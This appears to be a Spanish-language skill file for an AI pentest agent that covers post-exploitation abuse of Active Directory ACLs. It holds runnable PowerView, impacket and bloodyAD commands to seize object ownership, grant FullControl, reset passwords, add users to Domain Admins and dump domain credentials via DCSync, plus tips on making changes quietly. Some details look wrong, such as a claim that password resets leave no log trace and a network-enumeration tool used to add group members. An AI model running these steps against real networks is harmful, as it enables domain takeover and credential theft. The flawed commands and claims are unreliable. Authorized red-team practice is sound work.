---
name: ad-acl-abuse
description: Abusar ACLs de Active Directory — WriteOwner, WriteDACL, ForceChangePassword, GenericAll, AddMember, DCSync
phase: post
---

# AD ACL Abuse

## Activation Contract

**Cuando se usa:** Post-explotacion con acceso a un objeto AD cuyo DACL permite acciones privilegiadas. Data de BloodHound necesaria para identificar edges abusables.

**Input requerido:**
- `target_object`: objeto AD comprometido (usuario, grupo, computadora)
- `acl_edge`: tipo de abuso (WriteOwner, WriteDACL, ForceChangePassword, GenericAll, AddMember, DS-Replication-Get-Changes)
- `domain`: dominio target
- `dc_ip`: IP del Domain Controller

**Herramientas:** impacket (dacledit, owneredit, smbexec), PowerView, BloodHound, bloodyAD

## Hard Rules

1. NO modificar ACLs sin autorizacion — los cambios persisten hasta revertirse explicitamente
2. Documentar el DACL original antes de cualquier modificacion
3. Si abusas de WriteOwner, conserva el SID del owner original para revertir
4. ForceChangePassword no registra en logs de cambio de password (no deja rastro en el evento de cambio)
5. AddMember a grupos protegidos (Domain Admins, Enterprise Admins) genera alertas inmediatas
6. Preferir PowerView sobre net.exe para cambios silenciosos en ACLs

## Decision Gates

Preguntar antes de cada accion:

- **ForceChangePassword**: "Cambiar password del usuario `<target>` sin saber el actual. ?Proceder?"
- **AddMember a DA**: "Agregar nuestro usuario al grupo Domain Admins. Genera alertas. ?Continuar?"
- **WriteDACL**: "Modificar ACLs del objeto `<target>` para otorgarnos control total. ?Ejecutar?"
- **DCSync via ACL**: "Abusar del permiso DS-Replication-Get-Changes en `<target>` para DCSync. ?Autorizado?"

## Execution Steps

### 1. Identificar edges abusables con BloodHound

```bash
# Desde BloodHound: buscar paths donde nuestro usuario tenga edges como:
# WriteOwner, WriteDACL, ForceChangePassword, GenericAll, AddMember
# O usar PowerView directamente:
Find-InterestingObjectACL -ResolveGUIDs | ft
```

### 2. WriteOwner — Tomar ownership del objeto

```powershell
# PowerView: cambiar owner a nuestro usuario
Set-DomainObjectOwner -Identity <target_object> -OwnerIdentity <our_user>
# Ahora podemos modificar ACLs porque somos el owner
Add-DomainObjectACL -TargetIdentity <target_object> -PrincipalIdentity <our_user> -Rights FullControl
```

### 3. WriteDACL — Modificar ACLs directamente

```bash
# impacket-dacledit: agregar GenericAll a nuestro usuario
impacket-dacledit <domain>/<our_user>:<pass>@<dc_ip> \
  -action write -target <target_object> -principal <our_user> \
  -rights FullControl
```

### 4. ForceChangePassword — Resetear password sin saberlo

```powershell
# PowerView
$newPass = ConvertTo-SecureString "NuevoPass123!" -AsPlainText -Force
Set-DomainUserPassword -Identity <target_user> -AccountPassword $newPass

# bloodyAD (Linux)
bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> \
  set password <target_user> 'NuevoPass123!'
```

### 5. AddMember — Agregarse a grupo privilegiado

```bash
# impacket
impacket-netview <domain>/<user>:<pass>@<dc_ip> -target-group "Domain Admins"

# bloodyAD
bloodyAD add groupMember <domain>\Domain Admins <our_user>
```

### 6. DS-Replication-Get-Changes → DCSync

```bash
# Si nuestro usuario tiene este permiso, DCSync directamente
impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>
```

### 7. Revertir cambios (post-ejercicio)

```bash
# Restaurar owner original
impacket-dacledit -action write -target <target> -owner <original_owner_SID>
# Quitar permisos agregados
impacket-dacledit -action remove -target <target> -principal <our_user> -rights FullControl
```

## Output Contract

```json
{
  "skill": "ad-acl-abuse",
  "phase": "post",
  "domain": "domain.local",
  "abused_edge": "ForceChangePassword",
  "target_object": "user.admin",
  "original_owner_sid": "S-1-5-21-...-500",
  "acl_modified": ["ms-DS-CreatorSID", "ntSecurityDescriptor"],
  "commands_executed": ["Set-DomainUserPassword", "bloodyAD set password"],
  "new_credentials": {"username": "user.admin", "password": "NuevoPass123!"},
  "restoration_steps": ["Revert owner SID", "Remove explicit ACEs"],
  "detection_risk": "medium"
}
```
